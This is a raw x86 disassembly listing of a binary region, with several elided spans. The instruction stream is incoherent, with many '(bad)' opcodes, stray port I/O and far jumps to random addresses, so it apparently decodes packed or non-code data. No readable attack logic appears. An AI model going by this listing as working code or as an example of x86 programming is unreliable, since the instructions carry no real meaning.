  418aa9:	fbld   TBYTE PTR [edx+0x5fc6c79c]
  418aaf:	sbb    eax,DWORD PTR [edx]
  418ab1:	ins    BYTE PTR es:[edi],dx
  418ab2:	scas   al,BYTE PTR es:[edi]
  418ab3:	inc    edx
  418ab4:	outs   dx,BYTE PTR ds:[esi]
  418ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab6:	add    eax,DWORD PTR [ecx-0x79]
  418ab9:	call   0x3fa3396b
  418abe:	sbb    DWORD PTR [esi+edi*1+0x1],ecx
  418ac2:	mov    ds:0x6bf38af1,al
  418ac7:	lods   al,BYTE PTR ds:[esi]
  418ac8:	jp     0x418a68
  418aca:	das    
  418acb:	dec    eax
  418acc:	adc    ch,BYTE PTR [edx]
  418ace:	jge    0x418af5
  418ad0:	pop    eax
  418ad1:	inc    esi
  418ad2:	adc    bh,BYTE PTR [esi]
  418ad4:	ret    0x648e
  418ad7:	leave  
  418ad8:	xchg   cx,ax
  418ada:	mov    edi,eax
  418adc:	test   eax,0x1e72d8aa
  418ae1:	xor    al,0xe7
  418ae3:	mov    esi,0xc8230eca
  418ae8:	scas   al,BYTE PTR es:[edi]
  418ae9:	sbb    bl,BYTE PTR [ecx+0x63]
  418aec:	xchg   DWORD PTR [ecx-0x45],esp
  418aef:	fild   DWORD PTR [ebp+0x31894cb]
  418af5:	jmp    0x7b884f35
  418afa:	mov    esi,0x415d5734
  418aff:	repnz xchg edi,eax
  418b01:	aaa    
  418b02:	and    BYTE PTR [edx],dh
  418b04:	dec    esp
  418b05:	push   ebx
  418b06:	scas   al,BYTE PTR es:[edi]
  418b07:	dec    ecx
  418b08:	lds    edx,FWORD PTR [edi-0x50bf6d07]
  418b0e:	jle    0x418b02
  418b10:	ja     0x418ab1
  418b12:	mov    DWORD PTR [ebx+ecx*4+0x68ce0321],edi
  418b19:	jecxz  0x418ac5
  418b1b:	retf   
  418b1c:	in     al,dx
  418b1d:	nop
  418b1e:	ins    DWORD PTR es:[edi],dx
  418b1f:	aam    0xa3
  418b21:	sub    al,0xd5
  418b23:	icebp  
  418b24:	and    DWORD PTR [edx+eax*4-0x1a9ea07c],esp
  418b2b:	scas   al,BYTE PTR es:[edi]
  418b2c:	mov    WORD PTR [edi-0x4d1d3ab2],es
  418b32:	in     al,0x9f
  418b34:	nop
  418b35:	and    al,BYTE PTR [ebp-0x6652735e]
  418b3b:	sub    bl,ch
  418b3d:	push   esp
  418b3e:	inc    ebx
  418b3f:	mov    ?,eax
  418b41:	and    eax,0x9aa64472
  418b46:	pop    esp
  418b47:	out    dx,eax
  418b48:	sbb    esi,ebp
  418b4a:	xchg   ebx,eax
  418b4b:	test   eax,0x3a8c2748
  418b50:	dec    eax
  418b51:	(bad)
  418b54:	ret    0xb86c
  418b57:	jne    0x418b23
  418b59:	cmp    dh,bl
  418b5b:	neg    DWORD PTR gs:[ebp+0x48e7dd06]
  418b62:	imul   BYTE PTR [esp+edi*8]
  418b65:	test   BYTE PTR [ecx],al
  418b67:	push   cs
  418b68:	js     0x418b09
  418b6a:	shr    BYTE PTR [esi+0xe5],cl
	...
  418bd4:	add    BYTE PTR [eax],al
  418bd6:	jl     0x418beb
  418bd8:	test   DWORD PTR [edx],esi
  418bda:	out    dx,eax
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0x39
  418be3:	mov    DWORD PTR [edi+0x10a341c],esi
  418be9:	add    bh,bh
  418beb:	add    BYTE PTR [eax],al
  418bed:	add    BYTE PTR [edi-0x6b],bl
  418bf0:	addr16 data16 mov al,0x12
  418bf4:	in     al,0xb2
  418bf6:	in     al,0xfc
  418bf8:	mov    ecx,0xd1f6dc65
  418bfd:	fs daa 
  418bff:	mov    esp,0x5b2fd7ab
  418c04:	imul   ebx,eax,0x1ab34dd3
  418c0a:	inc    edx
  418c0b:	cmp    eax,0x4527f856
  418c10:	xor    BYTE PTR [esi],bh
  418c12:	(bad)  
  418c13:	mov    ecx,0xb5c3dccc
  418c18:	pop    edx
  418c19:	xor    eax,0x76e6dfc1
  418c1e:	inc    ebx
  418c1f:	fcomip st,st(4)
  418c21:	stc    
  418c22:	scas   eax,DWORD PTR es:[edi]
  418c23:	pop    ebx
  418c24:	imul   esi,DWORD PTR [ebx+0x35a26d75],0xffffff84
  418c2b:	mov    DWORD PTR [ecx+ecx*4-0x5a5ff69c],eax
  418c32:	jg     0x418bd2
  418c34:	nop
  418c35:	push   ss
  418c36:	loopne 0x418c6a
  418c38:	mov    ebx,0x684064fd
  418c3d:	lods   eax,DWORD PTR ds:[si]
  418c3f:	loope  0x418cb3
  418c41:	fadd   QWORD PTR [eax-0x31ca5bc7]
  418c47:	fwait
  418c48:	cli    
  418c49:	sub    eax,0xc4a79d7f
  418c4e:	arpl   WORD PTR [ecx+0x2],di
  418c51:	mov    eax,0x9466695d
  418c56:	int3   
  418c57:	pop    ss
  418c58:	scas   al,BYTE PTR es:[edi]
  418c59:	das    
  418c5a:	cdq    
  418c5b:	outs   dx,DWORD PTR ds:[esi]
  418c5c:	stc    
  418c5d:	sbb    BYTE PTR [ebx],dh
  418c5f:	xchg   ebp,eax
  418c60:	cli    
  418c61:	into   
  418c62:	xor    al,BYTE PTR [edi+0x451d844e]
  418c68:	inc    esi
  418c69:	(bad)  
  418c6a:	xchg   esi,eax
  418c6b:	cld    
  418c6c:	xchg   esp,eax
  418c6d:	nop
  418c6e:	fcom   QWORD PTR [eax+0x2b75e550]
  418c74:	imul   ecx,DWORD PTR [esi],0xe60a984f
  418c7a:	sbb    DWORD PTR [ebx],edi
  418c7c:	mov    cl,0xc2
  418c7e:	sbb    al,0x6c
  418c80:	lea    edi,[edi+0x34a8397a]
  418c86:	fucomip st,st(7)
  418c88:	es ret 0x4ca5
  418c8c:	and    ch,BYTE PTR [esi+0xdc9afb7]
  418c92:	mov    ds:0x166b75af,eax
  418c97:	cmp    al,0x29
  418c99:	ss mov ebx,0xdc1cb402
  418ca0:	push   edi
  418ca1:	enter  0x1c91,0x22
  418ca5:	data16 mov bh,0xd0
  418ca8:	(bad)  
  418ca9:	jmp    0x361f:0x8c722a1a
  418cb0:	neg    DWORD PTR [edx+0x43]
  418cb3:	lods   eax,DWORD PTR ds:[esi]
  418cb4:	adc    al,0xd3
  418cb6:	xchg   ecx,eax
  418cb7:	sub    DWORD PTR [edx-0x45],edi
  418cba:	or     al,0x84
  418cbc:	or     cl,bl
  418cbe:	ins    DWORD PTR es:[edi],dx
  418cbf:	sub    BYTE PTR [esi-0x3b],al
  418cc2:	dec    ebp
  418cc3:	out    dx,eax
  418cc4:	cmp    al,0x7c
  418cc6:	jo     0x418c81
  418cc8:	ja     0x418d09
  418cca:	jmp    0x418c98
  418ccc:	jp     0x418c7f
  418cce:	scas   al,BYTE PTR es:[edi]
  418ccf:	pushf  
  418cd0:	mov    eax,0xcac5f794
  418cd5:	lahf   
  418cd6:	mov    ah,al
  418cd8:	sbb    DWORD PTR [eax+0x211dd6e9],ebx
  418cde:	cwde   
  418cdf:	lea    esi,[edx-0x60]
  418ce2:	sbb    BYTE PTR ds:0x3dbc86d5,bh
  418ce8:	(bad)  
  418ce9:	arpl   WORD PTR [ebx+0x6695],si
	...
  418d53:	add    BYTE PTR [eax],al
  418d55:	add    bl,bh
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	shl    BYTE PTR [eax+0x23],cl
  418d64:	aam    0xf
  418d66:	xor    ecx,DWORD PTR [ebx]
  418d68:	add    DWORD PTR [eax],eax
  418d6a:	inc    DWORD PTR [eax]
  418d6c:	add    BYTE PTR [eax],al
  418d6e:	pop    ss
  418d6f:	clc    
  418d70:	push   ecx
  418d71:	iret   
  418d72:	fidivr DWORD PTR [edi]
  418d74:	in     eax,dx
  418d75:	shl    DWORD PTR [eax+0xe],cl
  418d78:	loope  0x418d96
  418d7a:	fcom   QWORD PTR [ecx+0xee5d1f9]
  418d80:	sar    DWORD PTR [edi],cl
  418d82:	and    DWORD PTR [ebp-0x7a],ebp
  418d85:	dec    esp
  418d86:	mov    cl,0xb1
  418d88:	loope  0x418d6e
  418d8a:	jb     0x418d4d
  418d8c:	icebp  
  418d8d:	shr    BYTE PTR ss:[ebx-0x64a71c98],cl
  418d94:	jbe    0x418d8f
  418d96:	pusha  
  418d97:	loopne 0x418d1c
  418d99:	jmp    0x11413b59
  418d9e:	cmp    ah,BYTE PTR [ebp+0x60]
  418da1:	mov    eax,0x891183ac
  418da6:	inc    edx
  418da7:	lods   eax,DWORD PTR ds:[esi]
  418da8:	dec    esi
  418da9:	cmp    cl,BYTE PTR [ecx+0x261db766]
  418daf:	adc    edx,DWORD PTR [edi-0x36]
  418db2:	xor    ebp,DWORD PTR [esi-0x1d]
  418db5:	pushf  
  418db6:	test   eax,0x79270b45
  418dbb:	cmp    al,bh
  418dbd:	inc    ecx
  418dbe:	and    ch,BYTE PTR [eax+ebp*2]
  418dc1:	shl    DWORD PTR [edi+0x22593e5a],1
  418dc7:	mov    ecx,0x52cb8933
  418dcc:	scas   al,BYTE PTR es:[edi]
  418dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dce:	popa   
  418dcf:	cmp    BYTE PTR [edx+0x68f5ba68],0x81
  418dd6:	xor    esp,ebp
  418dd8:	leave  
  418dd9:	dec    ecx
  418dda:	dec    eax
  418ddb:	data16 int3 
  418ddd:	in     al,0xe5
  418ddf:	fisttp DWORD PTR [eax]
  418de1:	cli    
  418de2:	in     eax,0x18
  418de4:	jecxz  0x418e59
  418de6:	jbe    0x418e67
  418de8:	sbb    ebx,DWORD PTR [ecx]
  418dea:	lods   eax,DWORD PTR ds:[esi]
  418deb:	push   cs
  418dec:	(bad)  
  418ded:	jl     0x418d95
  418def:	mov    ds:0x36338043,al
  418df4:	gs cmp al,0x80
  418df7:	pop    eax
  418df8:	mov    WORD PTR [edx+ecx*1],?
  418dfb:	or     DWORD PTR [eax],0xca77dad0
  418e01:	push   ebp
  418e02:	xor    DWORD PTR [ebx+0x3a4d767f],edx
  418e08:	loop   0x418e05
  418e0a:	jecxz  0x418e4f
  418e0c:	and    al,BYTE PTR [ebx-0x14]
  418e0f:	xchg   BYTE PTR ds:0xc9d69551,ah
  418e15:	mov    dl,0x80
  418e17:	sbb    eax,0xf8d732
  418e1c:	and    ch,0x80
  418e1f:	mov    ds:0xa5edd02f,al
  418e24:	retf   0xf1a5
  418e27:	(bad)  
  418e28:	or     al,0xb3
  418e2a:	push   ebp
  418e2b:	jge    0x418e2a
  418e2d:	dec    edi
  418e2e:	add    ecx,DWORD PTR [ebx-0x4a]
  418e31:	test   BYTE PTR [ebx+0x18],ch
  418e34:	sub    al,0x44
  418e36:	mov    edx,0xa3fccb55
  418e3b:	or     eax,DWORD PTR [edi]
  418e3d:	cmp    DWORD PTR [ebp+0x4229c7e6],esi
  418e43:	in     eax,0xda
  418e45:	test   esi,0xa72d2ba
  418e4b:	pop    ss
  418e4c:	test   BYTE PTR [eax],ah
  418e4e:	cli    
  418e4f:	imul   esp,DWORD PTR [ecx-0x6a],0xffffffec
  418e53:	fld    QWORD PTR [esi-0x7b]
  418e56:	test   eax,0xbb94097
  418e5b:	or     esi,edi
  418e5d:	mov    ch,0x6e
  418e5f:	xor    eax,DWORD PTR ds:0x49cb1dda
  418e65:	xor    ecx,DWORD PTR [eax+0x5e4a7127]
  418e6b:	std    
  418e6c:	fild   DWORD PTR [eax]
	...
  418ed6:	push   cs
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x3]
  418ee3:	mov    bh,bh
  418ee5:	pop    ds
  418ee6:	xor    cl,BYTE PTR [ecx+eax*1]
  418ee9:	add    bh,bh
  418eeb:	add    BYTE PTR [eax],al
  418eed:	add    BYTE PTR [edi-0x7df0e548],dl
  418ef3:	mov    cl,0xee
  418ef5:	xchg   edi,eax
  418ef6:	xchg   DWORD PTR [ebp+0x1b58dcfe],esp
  418efc:	in     al,dx
  418efd:	xor    edi,eax
  418eff:	nop
  418f00:	mov    BYTE PTR [ecx-0x6b],dl
  418f03:	mov    cl,0xdd
  418f05:	out    0x4e,al
  418f07:	jle    0x418ef4
  418f09:	push   ebp
  418f0a:	lods   eax,DWORD PTR ds:[esi]
  418f0b:	gs dec ebp
  418f0d:	xchg   edi,eax
  418f0e:	xchg   edi,eax
  418f0f:	scas   eax,DWORD PTR es:[edi]
  418f10:	jecxz  0x418ef0
  418f12:	pusha  
  418f13:	cmc    
  418f14:	mov    DWORD PTR [ecx+0x7c587780],eax
  418f1a:	or     BYTE PTR [ebx],al
  418f1c:	mov    eax,0xccb4f174
  418f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f22:	or     al,BYTE PTR [esi-0x3a4d7ae8]
  418f28:	mov    ebp,0xece0c219
  418f2d:	cmp    DWORD PTR [ebp-0x4d],esp
  418f30:	pop    ss
  418f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f32:	call   0x734c:0x1790af95
  418f39:	add    BYTE PTR [esi+edx*4],dl
  418f3c:	leave  
  418f3d:	addr16 jns 0x418f60
  418f40:	adc    BYTE PTR [edx+0x30],dl
  418f43:	imul   dx,WORD PTR [edx],0xca4d
  418f48:	aas    
  418f49:	push   ecx
  418f4a:	out    dx,al
  418f4b:	pop    esp
  418f4c:	cld    
  418f4d:	sbb    DWORD PTR [eax+0x1],edi
  418f50:	shl    BYTE PTR [eax],0xbb
  418f53:	inc    ebp
  418f54:	outs   dx,BYTE PTR ds:[esi]
  418f55:	(bad)  [edx+edx*4-0x210ab4a3]
  418f5c:	and    al,0x4b
  418f5e:	stc    
  418f5f:	inc    edi
  418f60:	pop    edi
  418f61:	adc    BYTE PTR [ecx-0xb],bh
  418f64:	fidiv  DWORD PTR [ebp-0x5f]
  418f67:	in     al,dx
  418f68:	mov    ebx,0x81d1da05
  418f6d:	mov    bl,0xbd
  418f6f:	(bad)  
  418f70:	pop    esp
  418f71:	cld    
  418f72:	(bad)  
  418f73:	sbb    ebp,edx
  418f75:	xor    eax,0xb3069b26
  418f7a:	jae    0x418f6c
  418f7c:	pop    esi
  418f7d:	cmp    ecx,esp
  418f7f:	scas   al,BYTE PTR es:[edi]
  418f80:	in     al,0xdb
  418f82:	stc    
  418f83:	mov    ds:0xddeaa656,al
  418f88:	sbb    ebp,ebp
  418f8a:	lds    edi,FWORD PTR [ecx+esi*2-0x59]
  418f8e:	mov    ch,0x5f
  418f90:	pop    ss
  418f91:	sub    eax,DWORD PTR [esi]
  418f93:	retf   0x97dc
  418f96:	and    DWORD PTR [ebx+0xb],0x8d2c5b7d
  418f9d:	mov    eax,ecx
  418f9f:	inc    esp
  418fa0:	iret   
  418fa1:	xchg   BYTE PTR [edx],cl
  418fa3:	push   esi
  418fa4:	xchg   esi,eax
  418fa5:	ret    0xbe0
  418fa8:	sub    BYTE PTR [ebx],bl
  418faa:	pop    ecx
  418fab:	cwde   
  418fac:	jmp    0x6571:0x63be3089
  418fb3:	aas    
  418fb4:	pop    ebx
  418fb5:	(bad)  
  418fb6:	jo     0x418f7b
  418fb8:	mov    ebx,0x9b085170
  418fbd:	sub    eax,esi
  418fbf:	xchg   DWORD PTR [eax+0x4f970031],esi
  418fc5:	jge    0x418f9a
  418fc7:	mov    ebx,0x82ed8de7
  418fcc:	sar    DWORD PTR [eax+0xd],cl
  418fcf:	(bad)  
  418fd0:	mov    esp,0x572a1f3f
  418fd5:	sub    al,0xdc
  418fd7:	inc    eax
  418fd8:	or     al,0xb1
  418fda:	inc    edi
  418fdb:	cmp    eax,0x99b6ba94
  418fe0:	mov    eax,ds:0xc4b5becc
  418fe5:	stc    
  418fe6:	push   0xffffffbc
  418fe8:	mov    cl,cl
  418fea:	mov    edi,0x2aaf
	...
  419053:	add    BYTE PTR [eax],al
  419055:	add    BYTE PTR [edi+edx*4],bl
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx-0x40150e59]
  419063:	pop    ebx
  419064:	iret   
  419065:	ja     0x419098
  419067:	or     eax,0xff0001
  41906c:	add    BYTE PTR [eax],al
  41906e:	xor    ch,BYTE PTR [bx+0x1b]
  419072:	dec    ebp
  419073:	into   
  419074:	jae    0x41904e
  419076:	test   eax,0x16732f80
  41907b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41907c:	xchg   esp,eax
  41907d:	ja     0x419058
  41907f:	mov    ebp,0x4e3f586
  419084:	xchg   esi,eax
  419085:	dec    ebp
  419086:	repz mov al,0xd9
  419089:	jns    0x4190db
  41908b:	test   BYTE PTR [esi+0x2c3e8ac6],cl
  419091:	imul   ebx,DWORD PTR [edx],0x24
  419094:	aam    0x1e
  419096:	inc    eax
  419097:	out    dx,al
  419098:	inc    eax
  419099:	jl     0x419050
  41909b:	jmp    0x33e7a627
  4190a0:	mov    edx,0x4713b3dd
  4190a5:	add    eax,0x72ac2ec3
  4190aa:	mov    eax,ds:0x4fec9515
  4190af:	sub    DWORD PTR [ecx-0x4024acac],ebp
  4190b5:	pop    edi
  4190b6:	ds push ecx
  4190b8:	and    BYTE PTR [ebp+0x47],ch
  4190bb:	cmp    edi,edi
  4190bd:	push   ecx
  4190be:	pop    ebp
  4190bf:	in     al,0x48
  4190c1:	pop    es
  4190c2:	cmp    ebp,DWORD PTR ds:0x28a4b8aa
  4190c8:	popf   
  4190c9:	jmp    0x4190e1
  4190cb:	idiv   DWORD PTR [eax-0x7a82175e]
  4190d1:	fbstp  TBYTE PTR [ebx]
  4190d3:	int3   
  4190d4:	cmp    BYTE PTR [edx-0x62],ah
  4190d7:	daa    
  4190d8:	push   ds
  4190d9:	xor    ecx,DWORD PTR [eax+0x438adf97]
  4190df:	jg     0x419061
  4190e1:	test   al,0x26
  4190e3:	sub    eax,0x349ea51
  4190e8:	pop    edx
  4190e9:	jmp    0x41909e
  4190eb:	push   0x30
  4190ed:	js     0x419077
  4190ef:	pop    esi
  4190f0:	inc    ebp
  4190f1:	repz fist DWORD PTR [esi+0x1e]
  4190f5:	(bad)  
  4190f7:	inc    esp
  4190f8:	std    
  4190f9:	push   ss
  4190fa:	fwait
  4190fb:	push   edx
  4190fc:	ror    BYTE PTR [ebx],1
  4190fe:	pop    ds
  4190ff:	and    dh,bh
  419101:	les    eax,FWORD PTR [esp+ecx*4+0x7d8c2f5e]
  419108:	lds    ecx,FWORD PTR [esi-0x67]
  41910b:	cmp    eax,0x3825fb2b
  419110:	shl    BYTE PTR [edx],cl
  419112:	cmp    ah,BYTE PTR [ebx+0x37]
  419115:	call   0x7e83885a
  41911a:	xor    BYTE PTR [esi+0x3c],0x4
  41911e:	in     eax,0x98
  419120:	into   
  419121:	jmp    0x419185
  419123:	mov    WORD PTR [esi-0x30],ss
  419126:	and    al,0x86
  419128:	cmp    edx,DWORD PTR [edi+0xf86ec44]
  41912e:	ins    BYTE PTR es:[edi],dx
  41912f:	mov    eax,ds:0xc399b8a1
  419134:	add    eax,0x9bbce487
  419139:	push   ebx
  41913a:	sub    DWORD PTR [edx+0x16],ebx
  41913d:	xchg   DWORD PTR [eax+0x78],ecx
  419140:	jle    0x4190ca
  419142:	mov    ds:0xe7607866,eax
  419147:	xor    al,0x2f
  419149:	jbe    0x41912e
  41914b:	int    0xd6
  41914d:	sub    edi,DWORD PTR [esi+0x3ce37d33]
  419153:	sbb    edx,DWORD PTR ds:0x3a4b
  419158:	inc    ecx
  419159:	cmp    cl,0x98
  41915c:	out    dx,eax
  41915d:	lahf   
  41915e:	into   
  41915f:	sub    al,0x1
  419161:	loop   0x41917e
  419163:	or     bh,dl
  419165:	sub    dh,bh
  419167:	rcl    BYTE PTR [ebx+0x5d5c2826],1
	...
  4191d5:	add    BYTE PTR [edi-0x41bd617b],ch
  4191db:	pop    ebx
  4191dc:	(bad)  
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     dh,cl
  4191e3:	xor    ebp,esp
  4191e5:	push   ss
  4191e6:	xor    BYTE PTR [esi],cl
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	inc    DWORD PTR [eax]
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	push   ecx
  4191ef:	xchg   edi,eax
  4191f0:	or     DWORD PTR [ecx+0x7f49003b],edx
  4191f6:	das    
  4191f7:	mov    ebp,0xd3f37d05
  4191fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191fe:	mov    BYTE PTR [edx-0x34],bl
  419201:	sbb    DWORD PTR [ebx-0x32f11b94],esi
  419207:	lahf   
  419208:	xlat   BYTE PTR ds:[ebx]
  419209:	push   esp
  41920a:	or     BYTE PTR [ecx+0x414a802f],ch
  419210:	inc    esi
  419211:	mov    WORD PTR [ebp-0xc],ds
  419214:	add    bl,ch
  419216:	popa   
  419217:	mov    dl,0x23
  419219:	dec    edx
  41921a:	xchg   ecx,eax
  41921b:	mov    ch,0x75
  41921d:	rol    BYTE PTR [edx-0x7125b0c9],1
  419223:	ror    DWORD PTR [esi],0x6e
  419226:	dec    ebx
  419227:	xchg   esi,eax
  419228:	adc    eax,0xc2429ba8
  41922d:	xor    BYTE PTR [ebp+0x35],0x7c
  419231:	dec    ecx
  419232:	out    0xb5,al
  419234:	std    
  419235:	jmp    0xeb6b:0x80e8aaca
  41923c:	gs dec ecx
  41923e:	xchg   esi,eax
  41923f:	pusha  
  419240:	fyl2x  
  419242:	adc    al,al
  419244:	mov    dh,0x49
  419246:	call   0xe557:0xb251bea7
  41924d:	mov    al,0xed
  41924f:	fsub   QWORD PTR [edx]
  419251:	ins    BYTE PTR es:[edi],dx
  419252:	sub    eax,0x6f4bd2a8
  419257:	xchg   edi,eax
  419258:	out    dx,eax
  419259:	xor    DWORD PTR [edx+0x1a],ebp
  41925c:	pop    ebp
  41925d:	int    0x7b
  41925f:	ins    DWORD PTR es:[edi],dx
  419260:	in     eax,dx
  419261:	outs   dx,DWORD PTR ds:[esi]
  419262:	xor    BYTE PTR [edx+0x494ab8b3],dh
  419268:	bnd je 0x419200
  41926b:	add    BYTE PTR [edx-0x210c6fe],al
  419271:	cmp    DWORD PTR [edi-0x61],eax
  419274:	popa   
  419275:	sub    al,0x7f
  419277:	pop    eax
  419278:	sub    BYTE PTR [ecx],ch
  41927a:	arpl   WORD PTR [ebx],bp
  41927c:	outs   dx,DWORD PTR ds:[esi]
  41927d:	popa   
  41927e:	push   edx
  41927f:	xchg   edx,eax
  419280:	sub    BYTE PTR [ecx+ebp*1-0x5d493de3],0x5b
  419288:	or     DWORD PTR [esp+eiz*2+0x16],ebp
  41928c:	and    ecx,DWORD PTR ds:0x84d3a012
  419292:	nop
  419293:	inc    esi
  419294:	pop    edi
  419295:	repnz fmul DWORD PTR [edi+0x73]
  419299:	or     eax,0x78f51801
  41929e:	push   es
  41929f:	(bad)  
  4192a0:	sti    
  4192a1:	xchg   esp,eax
  4192a2:	pop    esi
  4192a3:	push   ecx
  4192a4:	mov    ebp,0x60343f4d
  4192a9:	and    BYTE PTR [edi-0x47],bh
  4192ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192ad:	in     al,dx
  4192ae:	push   0x21c3cfa7
  4192b3:	iret   
  4192b4:	add    eax,0x2698a59f
  4192b9:	or     DWORD PTR [esi+0xc],0x2c
  4192bd:	cmc    
  4192be:	loope  0x419318
  4192c0:	and    eax,0x55e2aab5
  4192c5:	sbb    dl,al
  4192c7:	data16 adc al,0x54
  4192ca:	mov    edi,0x32e910ec
  4192cf:	inc    esi
  4192d0:	inc    esi
  4192d1:	out    0x8,eax
  4192d3:	jo     0x4192f0
  4192d5:	and    BYTE PTR [ecx+0x39a8cb00],0xf3
  4192dc:	cmp    BYTE PTR [ecx+edx*1-0xd],ah
  4192e0:	(bad)  
  4192e1:	mov    dl,BYTE PTR [edi]
  4192e3:	pop    es
  4192e4:	fdiv   QWORD PTR [eax]
  4192e6:	dec    edi
  4192e7:	arpl   WORD PTR [esp+ebx*1+0x8a1180],di
	...
  419356:	mov    al,ds:0xff33bae7
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	add    eax,0x2fda72ae
  419367:	sgdtd  [eax]
  41936a:	inc    DWORD PTR [eax]
  41936c:	add    BYTE PTR [eax],al
  41936e:	pop    ecx
  41936f:	push   es
  419370:	cli    
  419371:	push   ebp
  419372:	cmp    dh,dh
  419374:	ret    0xba1c
  419377:	mov    edx,0xf8432ead
  41937c:	js     0x4193ea
  41937e:	imul   ecx,DWORD PTR [ebp-0x74],0x7668ae25
  419385:	(bad)  
  419386:	ins    BYTE PTR es:[edi],dx
  419387:	dec    edx
  419388:	dec    esp
  419389:	xor    eax,0x8955ffd9
  41938e:	jge    0x4193a4
  419390:	dec    ecx
  419391:	and    ebx,ebp
  419393:	(bad)  
  419395:	add    esi,DWORD PTR [esi-0x7ef2ee6f]
  41939b:	mov    esp,0xbde70c
  4193a0:	(bad)  
  4193a1:	mov    ch,0x62
  4193a3:	data16 jno 0x41941a
  4193a6:	jns    0x4193f2
  4193a8:	fimul  DWORD PTR [ebx]
  4193aa:	sbb    DWORD PTR [ebp-0x42],ebp
  4193ad:	retf   
  4193ae:	or     al,0x4d
  4193b0:	push   edx
  4193b1:	fwait
  4193b2:	ja     0x4193a3
  4193b4:	inc    esi
  4193b5:	and    esp,DWORD PTR [ebx+0x1a]
  4193b8:	out    0xcb,al
  4193ba:	les    ebp,FWORD PTR [ecx]
  4193bc:	push   esp
  4193bd:	rcr    BYTE PTR [eax+ebx*1+0x76b36351],1
  4193c4:	pop    edi
  4193c5:	test   BYTE PTR [ecx],cl
  4193c7:	ret    0x2b50
  4193ca:	dec    ebp
  4193cb:	mov    al,0x88
  4193cd:	fwait
  4193ce:	xchg   ecx,eax
  4193cf:	in     eax,dx
  4193d0:	add    al,0x8a
  4193d2:	(bad)  
  4193d3:	test   al,0x23
  4193d5:	rcr    DWORD PTR [eax-0x76],cl
  4193d8:	jno    0x41938d
  4193da:	fmul   QWORD PTR [edi-0x26]
  4193dd:	add    BYTE PTR [esi-0x289c6393],bl
  4193e3:	in     eax,dx
  4193e4:	out    0x3c,al
  4193e6:	xor    al,0x1f
  4193e8:	mov    edx,0x734b5a4e
  4193ed:	xchg   esi,eax
  4193ee:	dec    esi
  4193ef:	retf   0x7a86
  4193f2:	stos   DWORD PTR es:[edi],eax
  4193f3:	popf   
  4193f4:	stos   BYTE PTR es:[edi],al
  4193f5:	call   0x9f4a:0x8d309458
  4193fc:	ror    ebp,cl
  4193fe:	push   ss
  4193ff:	push   esi
  419400:	sub    ebp,0xffffffe1
  419403:	mov    al,ds:0x9580309
  419408:	cdq    
  419409:	(bad)
  41940c:	mov    esi,0x838a01e3
  419411:	mov    edi,0x7b817dfc
  419416:	divps  xmm7,xmm0
  419419:	xor    cl,BYTE PTR [ebp+0x4809dd0d]
  41941f:	(bad)  
  419420:	sti    
  419421:	les    esi,FWORD PTR [edi]
  419423:	pop    esi
  419424:	fidiv  WORD PTR [edx-0x74]
  419427:	ret    0x5822
  41942a:	xor    ah,al
  41942c:	push   ecx
  41942d:	jl     0x419446
  41942f:	fucomi st,st(6)
  419431:	pop    esi
  419432:	or     eax,0xbf6eab00
  419437:	xchg   ebx,eax
  419438:	mov    al,0x37
  41943a:	outs   dx,DWORD PTR ds:[esi]
  41943b:	adc    dl,BYTE PTR [edi+0x58]
  41943e:	push   edx
  41943f:	outs   dx,BYTE PTR ds:[esi]
  419440:	sub    dl,dh
  419442:	cmp    eax,0x78a74ac7
  419447:	dec    ecx
  419448:	xor    ax,0x9160
  41944c:	add    dh,cl
  41944e:	xchg   ebp,eax
  41944f:	inc    esi
  419450:	outs   dx,BYTE PTR ds:[esi]
  419451:	jbe    0x419464
  419453:	aaa    
  419454:	inc    ecx
  419455:	in     eax,0x9a
  419457:	mov    edx,0xd081eb75
  41945c:	sub    cl,BYTE PTR [esi]
  41945e:	loope  0x41944a
  419460:	js     0x419468
  419462:	add    eax,0xf8ac236f
  419467:	mov    ah,0xbe
  419469:	jmp    0x11392d6
	...
  4194d6:	cmp    eax,0xed3a6998
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	sbb    bh,BYTE PTR [ebp+0x102efb75]
  4194e8:	add    DWORD PTR [eax],eax
  4194ea:	inc    DWORD PTR [eax]
  4194ec:	add    BYTE PTR [eax],al
  4194ee:	das    
  4194ef:	fimul  WORD PTR [ecx-0x554a5ea7]
  4194f5:	mov    bh,0xdc
  4194f7:	dec    edx
  4194f8:	mov    edi,0xba997302
  4194fd:	and    ecx,0x4d09e9a3
  419503:	sbb    eax,0x5a37ae21
  419508:	push   0xffffffa1
  41950a:	inc    edx
  41950b:	xchg   esi,ebp
  41950d:	loope  0x4194ac
  41950f:	xor    DWORD PTR [ecx+esi*2+0x1d752d5a],eax
  419516:	xchg   ecx,eax
  419517:	test   eax,0xf7e49766
  41951c:	or     BYTE PTR [edi-0x6d],0xaf
  419520:	ror    BYTE PTR [ecx-0x7dba101b],cl
  419526:	fcom   QWORD PTR [ecx]
  419528:	fild   DWORD PTR [esi-0xc]
  41952b:	aaa    
  41952c:	sub    BYTE PTR [edx+ecx*4-0x29eb0edd],ch
  419533:	or     edi,eax
  419535:	out    0x19,eax
